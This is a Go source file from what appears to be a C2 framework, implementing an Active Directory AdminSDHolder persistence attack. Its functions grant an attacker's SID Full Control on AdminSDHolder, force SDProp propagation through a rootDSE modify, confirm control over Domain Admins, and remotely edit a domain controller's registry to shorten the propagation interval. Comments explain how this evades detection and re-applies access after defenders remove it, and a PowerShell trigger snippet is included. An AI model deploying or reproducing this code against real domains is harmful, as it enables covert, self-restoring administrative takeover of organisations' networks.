package adminsdholder

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	SDProp (Security Descriptor Propagator) control.

	SDProp is a process that runs on the PDC Emulator Domain Controller.
	It runs on a 60-minute interval (MinAdminHolder registry value on the DC).
	Operators can trigger it immediately rather than waiting 60 minutes.

	Trigger method:
	  Modify the rootDSE attribute `runProtectAdminGroupsTask` to value 1.
	  This immediately schedules the next SDProp run.

	  In PowerShell:
	    $r = [adsi]"LDAP://RootDSE"
	    $r.Put("runProtectAdminGroupsTask", 1)
	    $r.SetInfo()

	  In LDAP terms: modify operation on DN="" (rootDSE) with
	    attribute: runProtectAdminGroupsTask, value: "1"

	Monitoring SDProp activity:
	  SDProp execution is logged via Event ID 4739 (Domain Policy Changed)
	  and Event ID 4670 (Permissions on an object were changed) on the PDC.
	  These events should appear within seconds of triggering.

	Persistence tuning:
	  By default SDProp runs every 3600 seconds (1 hour).
	  The interval is controlled by:
	    HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\AdminSDProtectFrequency
	  Setting this to a lower value (e.g. 60 = every 60 seconds) makes
	  our persistence re-apply faster if defenders try to undo our changes.
	  (Requires Domain Admin to modify the DC registry.)
*/

import (
	"fmt"
	"time"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// SDPropResult reports the result of an SDProp trigger.
type SDPropResult struct {
	DC            string
	TriggeredAt   time.Time
	EstimatedDone time.Time
}

// TriggerSDProp forces an immediate SDProp run on the PDC Emulator.
// This propagates the AdminSDHolder ACL changes within seconds rather
// than waiting up to 60 minutes.
func TriggerSDProp(dc string) (*SDPropResult, error) {
	conn, err := openLDAPConn(dc)
	if err != nil {
		return nil, fmt.Errorf("LDAP connect to %s: %w", dc, err)
	}
	defer closeLDAPConn(conn)

	// Modify rootDSE: set runProtectAdminGroupsTask = 1.
	if err := modifyRootDSE(conn, "runProtectAdminGroupsTask", "1"); err != nil {
		return nil, fmt.Errorf("trigger SDProp: %w", err)
	}

	now := time.Now()
	// {{if .Config.Debug}}
	log.Printf("[adminsdholder] SDProp triggered on %s at %v", dc, now)
	// {{end}}
	return &SDPropResult{
		DC:            dc,
		TriggeredAt:   now,
		EstimatedDone: now.Add(30 * time.Second),
	}, nil
}

// SetSDPropInterval changes the SDProp run frequency on the DC.
// intervalSeconds: minimum 60, recommended 300+ to avoid detection.
// Requires write access to the DC's registry (usually Domain Admin).
func SetSDPropInterval(dc string, intervalSeconds uint32) error {
	const regPath = `SYSTEM\CurrentControlSet\Services\NTDS\Parameters`
	const valueName = "AdminSDProtectFrequency"

	// Connect to the remote registry.
	var remoteKey windows.Handle
	dcPtr, _ := windows.UTF16PtrFromString(`\\` + dc)
	machineKeyPtr, _ := windows.UTF16PtrFromString(`SYSTEM\CurrentControlSet\Services\NTDS\Parameters`)

	modAdvapi32Reg := windows.NewLazySystemDLL("advapi32.dll")
	procRegConnectRegistry := modAdvapi32Reg.NewProc("RegConnectRegistryW")
	procRegOpenKey := modAdvapi32Reg.NewProc("RegOpenKeyExW")
	procRegSetValue := modAdvapi32Reg.NewProc("RegSetValueExW")
	procRegCloseKey := modAdvapi32Reg.NewProc("RegCloseKey")

	var remoteHKLM windows.Handle
	r, _, _ := procRegConnectRegistry.Call(
		uintptr(unsafe.Pointer(dcPtr)),
		uintptr(windows.HKEY_LOCAL_MACHINE),
		uintptr(unsafe.Pointer(&remoteHKLM)),
	)
	if r != 0 {
		return fmt.Errorf("RegConnectRegistry(%s) error=%d", dc, r)
	}
	defer procRegCloseKey.Call(uintptr(remoteHKLM))

	r, _, _ = procRegOpenKey.Call(
		uintptr(remoteHKLM),
		uintptr(unsafe.Pointer(machineKeyPtr)),
		0,
		uintptr(windows.KEY_SET_VALUE),
		uintptr(unsafe.Pointer(&remoteKey)),
	)
	if r != 0 {
		return fmt.Errorf("RegOpenKeyEx(%s) error=%d", regPath, r)
	}
	defer procRegCloseKey.Call(uintptr(remoteKey))

	valueNamePtr, _ := windows.UTF16PtrFromString(valueName)
	r, _, _ = procRegSetValue.Call(
		uintptr(remoteKey),
		uintptr(unsafe.Pointer(valueNamePtr)),
		0,
		uintptr(windows.REG_DWORD),
		uintptr(unsafe.Pointer(&intervalSeconds)),
		4,
	)
	if r != 0 {
		return fmt.Errorf("RegSetValueEx(%s) error=%d", valueName, r)
	}
	// {{if .Config.Debug}}
	log.Printf("[adminsdholder] SDProp interval set to %d seconds on %s",
		intervalSeconds, dc)
	// {{end}}
	return nil
}

// WaitForPropagation waits for SDProp to propagate, then verifies our
// account has Full Control over a protected object (e.g. Domain Admins).
func WaitForPropagation(dc, domain, beneficiarySID, testObjectDN string, timeout time.Duration) (bool, error) {
	deadline := time.Now().Add(timeout)
	if deadline.IsZero() {
		deadline = time.Now().Add(90 * time.Second)
	}

	sidBytes, err := ParseSIDString(beneficiarySID)
	if err != nil {
		return false, err
	}

	for time.Now().Before(deadline) {
		conn, err := openLDAPConn(dc)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		sdBytes, err := readNTSecurityDescriptor(conn, testObjectDN)
		closeLDAPConn(conn)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		sd, err := ParseSecurityDescriptor(sdBytes)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		if sd.HasACEForSID(sidBytes) {
			// {{if .Config.Debug}}
			log.Printf("[adminsdholder] propagation confirmed on %s", testObjectDN)
			// {{end}}
			return true, nil
		}
		time.Sleep(5 * time.Second)
	}
	return false, fmt.Errorf("propagation not confirmed within timeout")
}

// FullAttack is the complete AdminSDHolder persistence attack:
//  1. Grant our SID Full Control on AdminSDHolder
//  2. Trigger immediate SDProp
//  3. Wait for propagation confirmation
func FullAttack(dc, domain, beneficiarySID string) error {
	// Step 1: Grant.
	_, err := Grant(&GrantConfig{
		DC:             dc,
		Domain:         domain,
		BeneficiarySID: beneficiarySID,
		AccessMask:     AccessFullControl,
	})
	if err != nil {
		return fmt.Errorf("grant: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[adminsdholder] ACE granted, triggering SDProp...")
	// {{end}}

	// Step 2: Trigger SDProp.
	if _, err := TriggerSDProp(dc); err != nil {
		// Non-fatal: propagation will happen within 60 minutes anyway.
		// {{if .Config.Debug}}
		log.Printf("[adminsdholder] SDProp trigger warning: %v", err)
		// {{end}}
	}

	// Step 3: Verify propagation on Domain Admins.
	testObj := "CN=Domain Admins,CN=Users," + domainToDN(domain)
	ok, err := WaitForPropagation(dc, domain, beneficiarySID, testObj, 90*time.Second)
	if err != nil || !ok {
		// {{if .Config.Debug}}
		log.Printf("[adminsdholder] propagation pending (will complete within 60 min)")
		// {{end}}
	} else {
		// {{if .Config.Debug}}
		log.Printf("[adminsdholder] persistence confirmed: %s has Full Control on %s",
			beneficiarySID, testObj)
		// {{end}}
	}
	return nil
}

// modifyRootDSE writes an attribute to the LDAP rootDSE (DN="").
func modifyRootDSE(conn uintptr, attr, value string) error {
	modWLDAP := windows.NewLazySystemDLL("wldap32.dll")
	procModify := modWLDAP.NewProc("ldap_modify_sW")

	attrPtr, _ := windows.UTF16PtrFromString(attr)
	valPtr, _ := windows.UTF16PtrFromString(value)
	vals := []*uint16{valPtr, nil}

	type ldapModW struct {
		ModOp   uint32
		ModType *uint16
		Values  **uint16
	}
	mod := ldapModW{
		ModOp:   2, // LDAP_MOD_REPLACE
		ModType: attrPtr,
		Values:  &vals[0],
	}
	mods := []*ldapModW{&mod, nil}

	emptyDN, _ := windows.UTF16PtrFromString("")
	r, _, _ := procModify.Call(
		conn,
		uintptr(unsafe.Pointer(emptyDN)),
		uintptr(unsafe.Pointer(&mods[0])),
	)
	if r != 0 {
		return fmt.Errorf("ldap_modify_s rootDSE error=%d", r)
	}
	return nil
}

// SDPropProtectedGroups lists the well-known groups that SDProp protects.
var SDPropProtectedGroups = []struct {
	Name string
	RID  uint32
}{
	{"Domain Admins", 512},
	{"Schema Admins", 518},
	{"Enterprise Admins", 519},
	{"Group Policy Creator Owners", 520},
	{"Administrators", 544},
	{"Account Operators", 548},
	{"Backup Operators", 551},
	{"Print Operators", 550},
	{"Server Operators", 549},
	{"Read-only Domain Controllers", 521},
	{"Replicator", 552},
}
